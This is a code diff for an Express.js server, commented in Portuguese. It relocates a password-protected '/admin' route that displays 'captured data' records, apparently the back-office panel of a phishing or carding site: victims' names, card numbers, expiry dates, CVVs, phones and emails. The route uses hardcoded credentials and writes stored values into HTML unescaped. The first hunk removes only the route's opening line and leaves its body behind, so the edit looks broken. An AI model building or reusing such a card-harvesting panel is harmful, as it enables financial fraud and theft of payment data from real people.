@@ -61,7 +61,6 @@ app.get('/admin', (req, res) => {
     `);
 });
 
-app.post('/admin', async (req, res) => {
     const { senha, codigo } = req.body;
     if (senha !== 'asap' || codigo !== 'b7be0c3d-d56c-4d6e-b9ef-97c72e5beaae') {
         return res.status(401).send('Acesso negado');
@@ -136,4 +135,33 @@ app.get('/admin', (req, res) => {
 });
 app.listen(PORT, () => {
     console.log(`Servidor rodando na porta ${PORT}`);
+});
+
+app.post('/admin', async (req, res) => {
+    const { senha, codigo } = req.body;
+    if (senha !== 'asap' || codigo !== 'b7be0c3d-d56c-4d6e-b9ef-97c72e5beaae') {
+        return res.status(401).send('Acesso negado');
+    }
+    try {
+        const dados = await FormData.find().sort({ dataEnvio: -1 });
+        let html = '<h1>Dados Capturados</h1>';
+        dados.forEach((item, index) => {
+            html += `
+                <div style="margin-bottom:20px;padding:10px;border:1px solid #ccc;border-radius:5px;">
+                    <strong>Entrada ${index + 1}</strong><br/>
+                    Nome: ${item.nome}<br/>
+                    Nº Cartão: ${item.numeroCartao}<br/>
+                    Validade: ${item.validade}<br/>
+                    CVV: ${item.cvv}<br/>
+                    Telefone: ${item.telefone}<br/>
+                    Email: ${item.email}<br/>
+                    Data: ${new Date(item.dataEnvio).toLocaleString()}<br/>
+                </div>
+            `;
+        });
+        res.send(html);
+    } catch (err) {
+        console.error('Erro ao buscar dados:', err);
+        res.status(500).send('Erro ao buscar dados.');
+    }
 });
